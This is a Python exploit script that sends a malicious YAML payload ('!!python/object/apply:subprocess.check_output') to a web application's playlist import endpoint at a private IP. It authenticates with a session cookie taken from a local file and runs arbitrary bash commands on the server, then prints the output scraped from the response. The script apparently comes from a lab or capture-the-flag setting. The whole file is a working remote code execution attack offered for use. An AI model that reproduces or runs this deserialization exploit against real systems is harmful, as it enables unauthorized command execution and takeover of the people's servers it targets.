import sys, requests, re

URL = "http://10.64.132.157/import"
cookie = open("web/cookies.txt").read()
m = re.search(r"session\s+(\S+)", cookie)
sess = m.group(1) if m else ""

cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
# build YAML payload: subprocess.check_output with ; true to ensure exit 0
yaml = '!!python/object/apply:subprocess.check_output\n- ["bash", "-c", %s]\n' % repr(cmd + "; true")
r = requests.post(URL, data={"playlist": yaml}, cookies={"session": sess}, timeout=25)
print("STATUS:", r.status_code, "SIZE:", len(r.text))
for mm in re.findall(r"<pre>(.*?)</pre>", r.text, re.S):
    # unescape html entities minimally
    txt = mm.replace("&#39;", "'").replace("&quot;", '"').replace("&gt;", ">").replace("&lt;", "<").replace("&amp;","&")
    # strip leading b' wrapper if present
    if txt.startswith("b'"):
        txt = txt[2:]
    if txt.endswith("'"):
        txt = txt[:-1]
    print(">>>", txt)
